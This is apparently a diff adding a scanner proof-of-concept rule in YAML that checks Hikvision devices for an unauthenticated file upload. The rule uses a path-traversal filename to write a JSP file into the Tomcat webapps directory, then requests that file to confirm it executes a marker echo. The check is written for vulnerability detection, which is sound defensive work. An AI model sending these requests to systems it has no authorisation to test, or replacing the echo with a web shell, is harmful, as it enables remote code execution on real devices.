@@ -1,0 +1,28 @@
+name: poc-yaml-hikvision-js-files-upload
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /center/api/files;.js
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe
+      body: "\
+        ------WebKitFormBoundaryxxmdzwoe\r\n\
+        Content-Disposition: form-data; name=\"upload\";filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp\"\r\n\
+        Content-Type:image/jpeg\r\n\
+        \r\n\
+        <%out.println(\"pboyjnnrfipmplsukdeczudsefxmywex\");%>\r\n\
+        ------WebKitFormBoundaryxxmdzwoe--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /clusterMgr/ukgmfyufsi.jsp;.js
+    expression: response.status == 200 && response.body.bcontains(b'pboyjnnrfipmplsukdeczudsefxmywex')
+expression: r0() && r1()
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139004308
